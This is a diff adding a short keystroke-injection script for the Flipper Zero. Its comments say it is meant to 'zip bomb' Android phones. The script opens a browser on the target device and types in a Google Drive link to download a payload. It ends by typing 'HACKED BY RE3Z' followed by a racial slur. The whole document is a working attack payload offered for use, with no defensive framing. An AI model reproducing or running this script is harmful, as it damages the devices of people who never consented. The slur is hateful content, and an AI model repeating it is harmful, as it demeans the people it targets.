@@ -1,0 +1,18 @@
+REM Made By RE3Z
+REM WARNING! Zip Bombs Android Phones
+REM This Script Is Made For The Flipper Zero To Hack Android OS
+REM Credit: John Hickens
+
+GUI b
+DELAY 600
+ENTER
+DELAY 1000
+CTRL l
+DELAY 100
+STRING https://drive.usercontent.google.com/download?id=1Rxj7C1yprcmdFT5ZVrHMiuCZ7EJUutzb&export=download&authuser=0&confirm=t&uuid=3a1bd379-18f8-4f11-99c5-6a4bf20ac7da&at=APZUnTVODaDlmV0oL9bAtsS8y1hl:1706387407441
+DELAY 100
+ENTER
+DELAY 500
+STRING f
+DELAY 10000
+STRING HACKED BY RE3Z NIGGA
